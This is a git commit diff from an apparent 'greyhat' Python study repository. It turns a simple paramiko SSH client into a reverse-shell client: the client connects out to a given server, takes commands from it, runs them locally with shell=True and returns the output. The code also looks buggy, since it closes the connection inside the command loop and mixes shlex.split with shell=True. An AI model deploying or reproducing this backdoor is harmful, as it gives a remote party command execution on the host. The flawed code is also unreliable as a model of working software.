7a38bf1c150a13cfa078d4b5094a404989339236
DanilishinArtem <danilishin-artem@mail.ru>
2025-10-20 15:35:14 +0300

    ssh client

--- Python_2_greyhat/NetTools/test.py
+++ Python_2_greyhat/NetTools/test.py
@@ -1,33 +1,42 @@
 import paramiko
-import logging
+import subprocess
+import shlex
 
-logging.basicConfig(level=logging.DEBUG)
-
-def ssh_command(ip, port, user, passwd, cmd):
+def ssh_command(ip, port, user, passwd, command):
     client = paramiko.SSHClient()
-    logging.info('Client created')
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    logging.info('Seted policy')
     client.connect(ip, port=port, username=user, password=passwd)
-    logging.info('Client connected')
-
-    _, stdout, stderr = client.exec_command(cmd)
-    logging.info('Command executed')
-    output = stdout.readlines() + stderr.readlines()
-    logging.info(f'Output: {output}')
-    if output:
-        print('---Output---')
-        for line in output:
-            print(line.strip())
+    print(f'[DEBUG] Connected...')
+    ssh_session = client.get_transport().open_session()
+    if ssh_session.active:
+        print(f'[DEBUG] ssh session is active')
+        print(f'[DEBUG] trying to send message: {command}')
+        ssh_session.send(command)
+    print(f'[DEBUG] ssh session started to receive message')
+    data = ssh_session.recv(1024).decode()
+    print(f'[DEBUG] data received: {data}')
+    print(data)
+    while True:
+        command = ssh_session.recv(1024)
+        try:
+            cmd = command.decode()
+            if cmd == 'exit':
+                client.close()
+                break
+            cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
+            ssh_session.send(cmd_output or 'okey')
+        except Exception as e:
+            ssh_session.send(str(e))
+        client.close()
+    return
 
 
 if __name__ == "__main__":
     import getpass
-    # user = getpass.getuser()
     user = input('Username: ')
-    password = getpass.getpass()
+    password = input('Password: ')
+    # password = getpass.getpass()
 
-    ip = input('Enter server IP: ') or '192.168.1.203'
-    port = input('Enter port or <CR>: ') or 2222
-    cmd = input('Enter command or <CR>: ') or 'id'
-    ssh_command(ip, port, user, password, cmd)
+    ip = input('Enter server IP: ')
+    port = input('Enter server port: ')
+    ssh_command(ip, port, user, password, 'ClientConnected')
